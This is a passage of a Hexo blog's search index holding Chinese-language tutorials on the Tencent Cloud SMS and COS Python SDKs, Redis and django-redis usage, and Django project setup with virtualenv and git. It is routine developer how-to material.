<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>腾讯云短信 &amp; 腾讯COS上传文件</title>
      <link href="/2020/08/02/%E8%85%BE%E8%AE%AF%E4%BA%91%E7%9F%AD%E4%BF%A1%20&amp;%20%E8%85%BE%E8%AE%AFCOS%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/"/>
      <url>/2020/08/02/%E8%85%BE%E8%AE%AF%E4%BA%91%E7%9F%AD%E4%BF%A1%20&amp;%20%E8%85%BE%E8%AE%AFCOS%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="腾讯云短信-amp-腾讯COS上传文件"><a href="#腾讯云短信-amp-腾讯COS上传文件" class="headerlink" title="腾讯云短信 &amp; 腾讯COS上传文件"></a>腾讯云短信 &amp; 腾讯COS上传文件</h1><h2 id="1-腾讯云短信"><a href="#1-腾讯云短信" class="headerlink" title="1.腾讯云短信"></a>1.腾讯云短信</h2><p>腾讯云短信注册参考：<a href="https://pythonav.com/wiki/detail/10/81/" target="_blank" rel="noopener">https://pythonav.com/wiki/detail/10/81/</a></p><p>发送短信代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="comment"># ssl._create_default_https_context = ssl._create_unverified_context</span></span><br><span class="line"><span class="keyword">from</span> qcloudsms_py <span class="keyword">import</span> SmsMultiSender, SmsSingleSender</span><br><span class="line"><span class="keyword">from</span> qcloudsms_py.httpclient <span class="keyword">import</span> HTTPError</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_sms_single</span><span class="params">(phone_num, template_id, template_param_list)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    单条发送短信</span></span><br><span class="line"><span class="string">    :param phone_num: 手机号</span></span><br><span class="line"><span class="string">    :param template_id: 腾讯云短信模板ID</span></span><br><span class="line"><span class="string">    :param template_param_list: 短信模板所需参数列表，例如:【验证码：&#123;1&#125;，描述：&#123;2&#125;】，则传递参数 [888,666]按顺序去格式化模板</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    appid = <span class="number">112142311</span>  <span class="comment"># 自己应用ID</span></span><br><span class="line">    appkey = <span class="string">"8cc5b87123y423423412387930004"</span>  <span class="comment"># 自己应用Key</span></span><br><span class="line">    sms_sign = <span class="string">"Python之路"</span>  <span class="comment"># 自己腾讯云创建签名时填写的签名内容（使用公众号的话这个值一般是公众号全称或简称）</span></span><br><span class="line">    sender = SmsSingleSender(appid, appkey)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = sender.send_with_param(<span class="number">86</span>, phone_num, template_id, template_param_list, sign=sms_sign)</span><br><span class="line">    <span class="keyword">except</span> HTTPError <span class="keyword">as</span> e:</span><br><span class="line">        response = &#123;<span class="string">'result'</span>: <span class="number">1000</span>, <span class="string">'errmsg'</span>: <span class="string">"网络异常发送失败"</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_sms_multi</span><span class="params">(phone_num_list, template_id, param_list)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    批量发送短信</span></span><br><span class="line"><span class="string">    :param phone_num_list:手机号列表</span></span><br><span class="line"><span class="string">    :param template_id:腾讯云短信模板ID</span></span><br><span class="line"><span class="string">    :param param_list:短信模板所需参数列表，例如:【验证码：&#123;1&#125;，描述：&#123;2&#125;】，则传递参数 [888,666]按顺序去格式化模板</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    appid = <span class="number">112142311</span></span><br><span class="line">    appkey = <span class="string">"8cc5b87123y423423412387930004"</span></span><br><span class="line">    sms_sign = <span class="string">"Python之路"</span></span><br><span class="line">    sender = SmsMultiSender(appid, appkey)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = sender.send_with_param(<span class="number">86</span>, phone_num_list, template_id, param_list, sign=sms_sign)</span><br><span class="line">    <span class="keyword">except</span> HTTPError <span class="keyword">as</span> e:</span><br><span class="line">        response = &#123;<span class="string">'result'</span>: <span class="number">1000</span>, <span class="string">'errmsg'</span>: <span class="string">"网络异常发送失败"</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    result1 = send_sms_single(<span class="string">"15131255089"</span>, <span class="number">548760</span>, [<span class="number">666</span>, ])</span><br><span class="line">    print(result1)</span><br><span class="line">    result2 = send_sms_single( [<span class="string">"15131255089"</span>, <span class="string">"15131255089"</span>, <span class="string">"15131255089"</span>, ],<span class="number">548760</span>, [<span class="number">999</span>, ])</span><br><span class="line">    print(result2)</span><br></pre></td></tr></table></figure><h2 id="2-腾讯COS上传文件"><a href="#2-腾讯COS上传文件" class="headerlink" title="2.腾讯COS上传文件"></a>2.腾讯COS上传文件</h2><h3 id="2-1-开通cos服务"><a href="#2-1-开通cos服务" class="headerlink" title="2.1 开通cos服务"></a>2.1 开通cos服务</h3><p><a href="https://console.cloud.tencent.com/cos5" target="_blank" rel="noopener">https://console.cloud.tencent.com/cos5</a></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/cos%E5%90%8E%E5%8F%B0.png"  alt="cos后台"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/cos%E5%88%9B%E5%BB%BA%E6%A1%B6.jpg"  alt="cos创建桶"></p><h3 id="2-2-python实现上传文件"><a href="#2-2-python实现上传文件" class="headerlink" title="2.2 python实现上传文件"></a>2.2 python实现上传文件</h3><p>安装所需的模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U cos-python-sdk-v5</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8</span></span><br><span class="line"><span class="comment"># appid 已在配置中移除,请在参数 Bucket 中带上 appid。Bucket 由 BucketName-APPID 组成</span></span><br><span class="line"><span class="comment"># 1. 设置用户配置, 包括 secretId，secretKey 以及 Region</span></span><br><span class="line"><span class="keyword">from</span> qcloud_cos <span class="keyword">import</span> CosConfig</span><br><span class="line"><span class="keyword">from</span> qcloud_cos <span class="keyword">import</span> CosS3Client</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">secret_id = <span class="string">'COS_SECRETID'</span>      <span class="comment"># 替换为用户的 secretId</span></span><br><span class="line">secret_key = <span class="string">'COS_SECRETKEY'</span>    <span class="comment"># 替换为用户的 secretKey</span></span><br><span class="line">region = <span class="string">'COS_REGION'</span>    <span class="comment"># 替换为用户的 Region,区域</span></span><br><span class="line"></span><br><span class="line">token = <span class="literal">None</span>                <span class="comment"># 使用临时密钥需要传入 Token，默认为空，可不填</span></span><br><span class="line">scheme = <span class="string">'https'</span>            <span class="comment"># 指定使用 http/https 协议来访问 COS，默认为 https，可不填</span></span><br><span class="line">config = CosConfig(Region=region, SecretId=secret_id, SecretKey=secret_key, Token=token, Scheme=scheme)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 获取客户端对象</span></span><br><span class="line">client = CosS3Client(config)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 创建桶</span></span><br><span class="line">response = client.create_bucket(</span><br><span class="line">Bucket=<span class="string">'hpsaas-1302636832'</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.上传文件</span></span><br><span class="line">response = client.upload_file(</span><br><span class="line">Bucket=<span class="string">'hpsaas-1302636832'</span>,<span class="comment"># 要上传桶的名称</span></span><br><span class="line">    LocalFilePath=<span class="string">'local.txt'</span>,<span class="comment"># 本地文件路径</span></span><br><span class="line">    Key=<span class="string">'picture.jpg'</span>,<span class="comment"># 上传到桶之后的文件名</span></span><br><span class="line">    PartSize=<span class="number">1</span>,</span><br><span class="line">    MAXThread=<span class="number">10</span>,</span><br><span class="line">   EnableMD5=<span class="literal">False</span></span><br><span class="line">)</span><br><span class="line">print(response[<span class="string">'ETag'</span>])</span><br></pre></td></tr></table></figure><p>例子1：上传文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qcloud_cos <span class="keyword">import</span> CosConfig</span><br><span class="line"><span class="keyword">from</span> qcloud_cos <span class="keyword">import</span> CosS3Client</span><br><span class="line"></span><br><span class="line">secret_id = <span class="string">'自己id'</span>  <span class="comment"># 替换为用户的srcretid</span></span><br><span class="line">secret_key = <span class="string">'自己的key'</span><span class="comment"># 替换为用户的 secretkey</span></span><br><span class="line"></span><br><span class="line">region = <span class="string">'ap-chengdu'</span>  <span class="comment"># 替换为用户的Region</span></span><br><span class="line"></span><br><span class="line">config = CosConfig(Regionregion, SecretId=secret_id, SecretKey=secret_key)</span><br><span class="line"></span><br><span class="line">client = CosS3Client(config)</span><br><span class="line"></span><br><span class="line">response = client.upload_file(</span><br><span class="line">Bucket=<span class="string">'hpsaas-1302636832'</span>,</span><br><span class="line">    LocalFilePath=<span class="string">'code.png'</span>,<span class="comment"># 本地文件路径</span></span><br><span class="line">    Key=<span class="string">'p1.png'</span>,<span class="comment"># 上传到桶之后的文件名</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">print(response[<span class="string">'ETag'</span>])</span><br></pre></td></tr></table></figure><p>例子2：创建桶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qcloud_cos <span class="keyword">import</span> CosConfig</span><br><span class="line"><span class="keyword">from</span> qcloud_cos <span class="keyword">import</span> CosS3Client</span><br><span class="line"></span><br><span class="line">secret_id = <span class="string">'自己id'</span>  <span class="comment"># 替换为用户的srcretid</span></span><br><span class="line">secret_key = <span class="string">'自己的key'</span><span class="comment"># 替换为用户的 secretkey</span></span><br><span class="line"></span><br><span class="line">region = <span class="string">'ap-chengdu'</span>  <span class="comment"># 替换为用户的Region</span></span><br><span class="line"></span><br><span class="line">config = CosConfig(Regionregion, SecretId=secret_id, SecretKey=secret_key)</span><br><span class="line"></span><br><span class="line">client = CosS3Client(config)</span><br><span class="line"></span><br><span class="line">response = client.create_bucket(</span><br><span class="line">Bucket=<span class="string">'examplebucket-12500000000'</span>,</span><br><span class="line">    ACL=<span class="string">"public-read"</span></span><br><span class="line">        <span class="comment"># private私有</span></span><br><span class="line">        <span class="comment"># public-read公共读私有写</span></span><br><span class="line">        <span class="comment"># public-read-write公共读公共写</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> SaaS平台 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>redis基本操作</title>
      <link href="/2020/08/02/redis%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
      <url>/2020/08/02/redis%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="redis基本操作"><a href="#redis基本操作" class="headerlink" title="redis基本操作"></a>redis基本操作</h1><h3 id="1-安装redis"><a href="#1-安装redis" class="headerlink" title="1. 安装redis"></a>1. 安装redis</h3><p>参考：<a href="https://pythonav.com/wiki/detail/10/82/" target="_blank" rel="noopener">https://pythonav.com/wiki/detail/10/82/</a></p><h3 id="2-python操作redis模块"><a href="#2-python操作redis模块" class="headerlink" title="2. python操作redis模块"></a>2. python操作redis模块</h3><p>安装redis模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install redis</span><br></pre></td></tr></table></figure><p>相关操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接连接redis</span></span><br><span class="line">conn = redis.Redis(host=<span class="string">'192.168.3.109'</span>, port=<span class="number">6379</span>, password=<span class="string">'foobared'</span>, encoding=<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置键值：111111="9999" 且超时时间为10秒（值写入到redis时会自动转字符串）</span></span><br><span class="line">conn.set(<span class="string">'111111'</span>, <span class="number">9999</span>, ex=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据键获取值：如果存在获取值（获取到的是字节类型）；不存在则返回None</span></span><br><span class="line">value = conn.get(<span class="string">'111111'</span>)</span><br><span class="line">print(value)</span><br></pre></td></tr></table></figure><p>上面python操作redis的示例是以直接创建连接的方式实现，每次操作redis如果都重新连接一次效率会比较低，建议使用redis连接池来替换，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建redis连接池（默认连接池最大连接数 2**31=2147483648）</span></span><br><span class="line">pool = redis.ConnectionPool(host=<span class="string">'192.168.3.109'</span>, port=<span class="number">6379</span>, password=<span class="string">'foobared'</span>, encoding=<span class="string">'utf-8'</span>, max_connections=<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去连接池中获取一个连接</span></span><br><span class="line">conn = redis.Redis(connection_pool=pool)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置键值：111111="9999" 且超时时间为10秒（值写入到redis时会自动转字符串）</span></span><br><span class="line">conn.set(<span class="string">'111111'</span>, <span class="number">9999</span>, ex=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据键获取值：如果存在获取值（获取到的是字节类型）；不存在则返回None</span></span><br><span class="line">value = conn.get(<span class="string">'name'</span>)</span><br><span class="line">print(value)</span><br></pre></td></tr></table></figure><h3 id="3-django-redis模块操作"><a href="#3-django-redis模块操作" class="headerlink" title="3.django-redis模块操作"></a>3.django-redis模块操作</h3><ol><li>安装django-redis模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install django-redis</span><br></pre></td></tr></table></figure><ol start="2"><li>在django项目的settings.py中添加相关配置</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">CACHES = &#123;</span><br><span class="line">    <span class="string">"default"</span>: &#123;</span><br><span class="line">        <span class="string">"BACKEND"</span>: <span class="string">"django_redis.cache.RedisCache"</span>,</span><br><span class="line">        <span class="string">"LOCATION"</span>: <span class="string">"redis://192.168.3.109"</span>, <span class="comment"># 安装redis的主机的 IP 和 端口</span></span><br><span class="line">        <span class="string">"OPTIONS"</span>: &#123;</span><br><span class="line">            <span class="string">"CLIENT_CLASS"</span>: <span class="string">"django_redis.client.DefaultClient"</span>,</span><br><span class="line">            <span class="string">"CONNECTION_POOL_KWARGS"</span>: &#123;</span><br><span class="line">                <span class="string">"max_connections"</span>: <span class="number">1000</span>,</span><br><span class="line">                <span class="string">"encoding"</span>: <span class="string">'utf-8'</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"PASSWORD"</span>: <span class="string">"foobared"</span> <span class="comment"># redis密码</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>在django的视图中操作redis</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> django_redis <span class="keyword">import</span> get_redis_connection</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="comment"># 去连接池中获取一个连接</span></span><br><span class="line">    conn = get_redis_connection(<span class="string">"default"</span>)</span><br><span class="line">    conn.set(<span class="string">'nickname'</span>, <span class="string">"hp"</span>, ex=<span class="number">10</span>)</span><br><span class="line">    value = conn.get(<span class="string">'nickname'</span>)</span><br><span class="line">    print(value)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"OK"</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> SaaS平台 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>前期准备</title>
      <link href="/2020/08/02/%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87/"/>
      <url>/2020/08/02/%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><h2 id="1-虚拟环境-virtualenv（项目环境隔离）"><a href="#1-虚拟环境-virtualenv（项目环境隔离）" class="headerlink" title="1.虚拟环境 virtualenv（项目环境隔离）"></a>1.虚拟环境 virtualenv（项目环境隔离）</h2><h3 id="1-1-安装"><a href="#1-1-安装" class="headerlink" title="1.1 安装"></a>1.1 安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install virtualenv</span><br></pre></td></tr></table></figure><h3 id="1-2-创建虚拟环境"><a href="#1-2-创建虚拟环境" class="headerlink" title="1.2 创建虚拟环境"></a>1.2 创建虚拟环境</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">virtualenv 环境名称</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：创建[环境名称]文件夹，放置所有的环境,进入指定的目录</span></span><br><span class="line">virtualenv 环境名称 --python=python3<span class="number">.6</span></span><br><span class="line">virtualenv 环境名称 --python=<span class="string">'C:\python\python3.6'</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 打开终端</span><br><span class="line"><span class="number">2.</span> 安装virtualenv</span><br><span class="line"><span class="number">3.</span> 关闭终端，重新打开</span><br><span class="line"><span class="number">4.</span> 通过命令进入指定目录</span><br></pre></td></tr></table></figure><h3 id="1-3-激活-退出-虚拟环境"><a href="#1-3-激活-退出-虚拟环境" class="headerlink" title="1.3 激活/退出 虚拟环境"></a>1.3 激活/退出 虚拟环境</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">win:</span><br><span class="line">    &gt;&gt;&gt;cd Scripts 进入虚拟环境Scripts目录</span><br><span class="line">    &gt;&gt;&gt;activate.exe激活虚拟环境</span><br><span class="line">mac：</span><br><span class="line">&gt;&gt;&gt; source s28/bin/activate</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">win:</span><br><span class="line">    &gt;&gt;&gt;cd Scripts</span><br><span class="line">    &gt;&gt;&gt;deactivate.exe退出虚拟环境</span><br><span class="line">mac：</span><br><span class="line">&gt;&gt;&gt; source s28/bin/deactivate</span><br></pre></td></tr></table></figure><h3 id="1-4-在虚拟环境中安装模块"><a href="#1-4-在虚拟环境中安装模块" class="headerlink" title="1.4 在虚拟环境中安装模块"></a>1.4 在虚拟环境中安装模块</h3><ul><li><p>激活虚拟环境</p></li><li><p>在激活环境中安装模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install django&#x3D;&#x3D;1.11.29</span><br><span class="line">pip install django&#x3D;&#x3D;1.11.29 -i https:&#x2F;&#x2F;pypi.douban.com&#x2F;simple --trusted-host pypi.douban.com</span><br></pre></td></tr></table></figure></li></ul><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E6%A8%A1%E5%9D%97.jpg"  alt="虚拟环境安装模块"></p><h2 id="2-搭建项目环境（Django-虚拟环境）"><a href="#2-搭建项目环境（Django-虚拟环境）" class="headerlink" title="2.搭建项目环境（Django+虚拟环境）"></a>2.搭建项目环境（Django+虚拟环境）</h2><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E5%88%9B%E5%BB%BA%E9%A1%B9%E7%9B%AE1.jpg"  alt="创建项目1"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E5%88%9B%E5%BB%BA%E9%A1%B9%E7%9B%AE2.jpg"  alt="创建项目2"></p><h2 id="3-本地配置"><a href="#3-本地配置" class="headerlink" title="3.本地配置"></a>3.本地配置</h2><h3 id="3-1-在settings-py文件中导入"><a href="#3-1-在settings-py文件中导入" class="headerlink" title="3.1 在settings.py文件中导入"></a>3.1 在settings.py文件中导入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> .local_settings <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="3-2创建自己的本地配置"><a href="#3-2创建自己的本地配置" class="headerlink" title="3.2创建自己的本地配置"></a>3.2创建自己的本地配置</h3><p>在自己的项目中创建local_settings.py文件，在该文件中修改setting的配置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LANGUAGE_CODE = <span class="string">'zh-hans'</span></span><br><span class="line"></span><br><span class="line">SMS = <span class="number">666</span></span><br></pre></td></tr></table></figure><h2 id="4-分享代码"><a href="#4-分享代码" class="headerlink" title="4.分享代码"></a>4.分享代码</h2><h3 id="4-1-创建一个远程的仓库（gitee-github）"><a href="#4-1-创建一个远程的仓库（gitee-github）" class="headerlink" title="4.1 创建一个远程的仓库（gitee/github）"></a>4.1 创建一个远程的仓库（gitee/github）</h3><h3 id="4-2-本地代码推送到git"><a href="#4-2-本地代码推送到git" class="headerlink" title="4.2 本地代码推送到git"></a>4.2 本地代码推送到git</h3><ul><li><p>让git忽略一些文件.gitgnore</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># pycharm</span><br><span class="line">.idea&#x2F;</span><br><span class="line">.DS_Store</span><br><span class="line"></span><br><span class="line">__pycache__&#x2F;</span><br><span class="line">*.py[cod]</span><br><span class="line">*$py.class</span><br><span class="line"></span><br><span class="line"># Django stuff:</span><br><span class="line">local_settings.py</span><br><span class="line">*.sqlite3</span><br><span class="line">medial&#x2F;</span><br><span class="line"></span><br><span class="line"># database migrations</span><br><span class="line">*&#x2F;migrations&#x2F;*.py</span><br><span class="line">!*&#x2F;migrations&#x2F;__init__.py</span><br><span class="line"></span><br><span class="line"># 代表注释</span><br></pre></td></tr></table></figure></li><li><p>项目需要安装的模块及版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; pip freeze &gt; requirements.txt</span><br><span class="line"></span><br><span class="line"># 会自己生成一个文件里面有该项目需要的模块及版本</span><br><span class="line"></span><br><span class="line"># 安装对应到模块及版本</span><br><span class="line">&gt;&gt;&gt; pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>git本地管理项目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; git init# 第一次运行</span><br><span class="line">&gt;&gt;&gt; git add .# 这个目录下的所有文件做追踪</span><br><span class="line">&gt;&gt;&gt; git commit -m &#39;注释&#39;   # 提交文件并注释</span><br></pre></td></tr></table></figure></li><li><p>git本地项目推送到远程仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; git push https:&#x2F;&#x2F;gitee.com&#x2F;... master# 推送到gitee仓库</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-3测试获取代码"><a href="#4-3测试获取代码" class="headerlink" title="4.3测试获取代码"></a>4.3测试获取代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; git clon https:&#x2F;&#x2F;...# 某项目代码的路径</span><br></pre></td></tr></table></figure><h2 id="SaaS-代码"><a href="#SaaS-代码" class="headerlink" title="SaaS 代码"></a>SaaS 代码</h2><p><a href="https://gitee.com/hp256/saas_platform/tree/master" target="_blank" 